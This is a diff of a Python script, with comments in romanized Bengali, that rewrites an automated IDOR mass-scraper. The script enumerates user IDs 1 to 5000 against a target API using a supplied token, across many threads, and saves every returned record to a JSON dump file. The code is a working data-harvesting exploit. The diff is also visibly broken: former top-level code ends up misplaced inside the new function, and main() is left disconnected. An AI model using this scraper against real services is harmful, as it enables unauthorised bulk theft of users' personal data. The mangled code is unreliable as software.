@@ -1,8 +1,8 @@
-#!/usr/bin/env python3
 
 import argparse
 import sys
 from typing import Optional
+import logging
 import re
 import time
 import json
@@ -1229,54 +1229,6 @@ def fetch_single_record(
         return None
 
 
-def enumerate_idor_data(
-    base_url: str,
-    headers: Dict[str, str],
-    start_id: int,
-    end_id: int,
-    max_workers: int = 10,
-) -> List[Dict[str, Any]]:
-    """Performs multi-threaded mass data scraping across an ID range."""
-    scraped_records: List[Dict[str, Any]] = []
-
-    logger.info(
-        f"Starting IDOR enumeration from ID {start_id} to {end_id} with {max_workers} threads..."
-    )
-
-    with requests.Session() as session:
-        # Session-er default headers update koreneya
-        session.headers.update(headers)
-
-        with concurrent.futures.ThreadPoolExecutor(
-            max_workers=max_workers
-        ) as executor:
-            future_to_id = {
-                executor.submit(
-                    fetch_single_record, session, base_url, user_id, headers
-                ): user_id
-                for user_id in range(start_id, end_id + 1)
-            }
-
-            for future in concurrent.futures.as_completed(future_to_id):
-                result = future.result()
-                if result:
-                    scraped_records.append(result)
-
-    logger.info(
-        f"Enumeration completed. Total records dumped: {len(scraped_records)}"
-    )
-    return scraped_records
-
-
-def save_dumped_data(data: List[Dict[str, Any]], filename: str = "idor_dump.json") -> None:
-    """Saves the scraped records into a JSON file."""
-    try:
-        with open(filename, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=4, ensure_ascii=False)
-        logger.info(f"Data successfully exported and saved to {filename}")
-    except IOError as e:
-        logger.error(f"Failed to save file {filename}: {e}")
-
 def main() -> None:
     
     """Run interactive public source discovery and IDOR analysis."""
@@ -1621,55 +1573,114 @@ def main() -> None:
         print(f"\n[ERROR] {type(error).__name__}: {error}")
 
 
+import concurrent.futures
+import json
+import logging
+from typing import Dict, List, Optional
+import requests
 
-BASE_URL = input("[?] Enter the target base URL: ").strip()
-    
-    # Apnar active session/token (Environment variable theke auto-load hobe, ba ekhane direct string dite paren)
-SESSION_COOKIE = os.getenv("TARGET_SESSION_COOKIE", "YOUR_SESSION_COOKIE_HERE")
-AUTH_TOKEN = os.getenv("TARGET_AUTH_TOKEN", "Bearer YOUR_ACCESS_TOKEN_HERE")
+# Logging setup kora hochhe
+logging.basicConfig(
+    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
+)
 
-HEADERS = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Cookie": f"session={SESSION_COOKIE}",
-        "Authorization": AUTH_TOKEN
+
+def dump_idor_data(
+    base_url: str,
+    start_id: int,
+    end_id: int,
+    headers: Dict[str, str],
+    output_filename: str = "dumped_users_data.json",
+    max_workers: int = 10,
+) -> None:
+  """Automated IDOR data scraping function to enumerate and dump user records
+
+  within a specified ID range using multithreading.
+  """
+  collected_data: List[Dict] = []
+  logging.info(
+      f"Starting IDOR enumeration from ID {start_id} to {end_id} with"
+      f" {max_workers} threads..."
+  )
+
+  def fetch_record(user_id: int) -> Optional[Dict]:
+    target_url = f"{base_url}/{user_id}"
+    try:
+      response = requests.get(target_url, headers=headers, timeout=10)
+      if response.status_code == 200:
+        try:
+          data = response.json()
+          logging.info(f"[+] Successfully dumped data for ID: {user_id}")
+          return {"id": user_id, "data": data}
+        except json.JSONDecodeError:
+          logging.warning(
+              f"[-] ID {user_id} returned 200 OK but response is not valid JSON."
+          )
+      elif response.status_code == 404:
+        logging.debug(f"[-] ID {user_id}: Not found (404)")
+      else:
+        logging.debug(f"[-] ID {user_id}: Status code {response.status_code}")
+    except requests.RequestException as e:
+      logging.error(f"[!] Request failed for ID {user_id}: {e}")
+    return None
+
+  # Concurrent execution for fast mass data scraping
+  with concurrent.futures.ThreadPoolExecutor(
+      max_workers=max_workers
+  ) as executor:
+    futures = {
+        executor.submit(fetch_record, uid): uid
+        for uid in range(start_id, end_id + 1)
     }
 
-    # Range and Performance Setup (Auto-configured)
-START_ID = 1
-END_ID = 5000          # Joto user-er data dump korte chan
-MAX_WORKERS = 25       # Thread speed adjustment
-OUTPUT_FILE = "automated_idor_dump.json"
+    for future in concurrent.futures.as_completed(futures):
+      result = future.result()
+      if result:
+        collected_data.append(result)
 
-logger.info("=== Automated IDOR Mass Scraper Initialized ===")
-logger.info(f"Target Base URL: {BASE_URL}")
+  # Results export kora hochhe JSON file-e
+  try:
+    with open(output_filename, "w", encoding="utf-8") as f:
+      json.dump(collected_data, f, indent=4, ensure_ascii=False)
+    logging.info(
+        f"[✔] Scraping completed! Total {len(collected_data)} records saved"
+        f" to {output_filename}"
+    )
+  except IOError as e:
+    logging.error(f"[!] Failed to save output file: {e}")
 
-    # ==========================================
-    # 🚀 FULLY AUTOMATED EXECUTION BLOCK
-    # ==========================================
-try:
-        logger.info("Starting automated enumeration across ID range...")
-        
-        # Ekbare function call-e shobkaj sesh hobe
-        dumped_data = enumerate_idor_data(
-            base_url=BASE_URL,
-            headers=HEADERS,
-            start_id=START_ID,
-            end_id=END_ID,
-            max_workers=MAX_WORKERS
-        )
 
-        # Automatic Saving/Exporting
-        if dumped_data:
-            save_dumped_data(data=dumped_data, filename=OUTPUT_FILE)
-            logger.info(f"[SUCCESS] Total {len(dumped_data)} records successfully dumped and saved to '{OUTPUT_FILE}'.")
-        else:
-            logger.warning("[WARNING] No records found. Either the range is invalid or authentication failed.")
+  """Main execution block for automated IDOR data dumping."""
+  # Target endpoint (IDOR vulnerability point jekhane ID change hoy)
+  BASE_URL = input("[?] Enter the base URL for IDOR testing (e.g., https://example.com/api/users): ").strip()
 
-except Exception as e:
-        logger.error(f"[ERROR] An unexpected error occurred during automated execution: {e}")
-        sys.exit(1)
+  # Authentication headers ba session cookies (jodi authorization lagbe)
+  HEADERS = {
+      "User-Agent": (
+          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      ),
+      "Authorization": "Bearer YOUR_SESSION_OR_AUTH_TOKEN_HERE",
+      "Accept": "application/json",
+  }
 
-logger.info("=== Automated Process Finished Successfully ===")
+  # Enumeration range ebong settings
+  START_USER_ID = 1
+  END_USER_ID = 5000  # Thousands of users range
+  OUTPUT_FILE = "exported_users_dump.json"
+  THREAD_COUNT = 20  # Fast parallel requests
+
+  # Fully automated execution from main
+  dump_idor_data(
+      base_url=BASE_URL,
+      start_id=START_USER_ID,
+      end_id=END_USER_ID,
+      headers=HEADERS,
+      output_filename=OUTPUT_FILE,
+      max_workers=THREAD_COUNT,
+  )
+
 
 if __name__ == "__main__":
-    main()
+  main()
+
+ 
